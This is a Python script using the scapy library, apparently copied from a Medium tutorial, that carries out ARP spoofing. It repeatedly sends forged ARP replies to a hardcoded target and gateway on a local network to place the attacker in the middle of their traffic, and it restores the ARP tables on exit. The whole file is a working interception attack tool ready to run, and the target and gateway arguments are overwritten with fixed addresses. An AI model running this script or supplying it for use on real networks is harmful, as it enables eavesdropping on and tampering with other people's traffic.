# found at https://mpostument.medium.com/arp-spoofer-with-python-and-scapy-b848d7bc15b3
# pip3 install scapy


import scapy.all as scapy
import time 
import argparse



def get_mac(ip):
    # Create arp packet object. pdst - destination host ip address
    arp_request = scapy.ARP(pdst=ip)
    # Create ether packet object. dst - broadcast mac address. 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine two packets in two one
    arp_request_broadcast = broadcast/arp_request
    # Get list with answered hosts
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # Return host mac address
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # Get target host ip address using previously created function
    target_mac = get_mac(target_ip)
    # Create ARP packet. target_ip - target host ip address, spoof_ip - gateway ip address
    # op=2 means that ARP is going to send answer 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send previously created packet without output
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    # Get target and gateway mac address
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    # Create ARP response packet with with right arp table information
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    # Send packet. Count 4 to make sure that host received packet
    scapy.send(packet, count=4, verbose=False)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    options = parser.parse_args()
    return options




if __name__ == "__main__":
    
    options = get_arguments()

    options.gateway = "192.168.0.1"
    options.target = "192.168.0.33"

    mac = get_mac(options.target)

    print(f"Target host is {options.target} {mac}")

    sent_packets_count = 0
    try:
        while True:
            spoof(options.target, options.gateway)
            spoof(options.gateway, options.target)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
        restore(options.target, options.gateway)
        restore(options.gateway, options.target)
        print("\nARP table restored. Quiting")



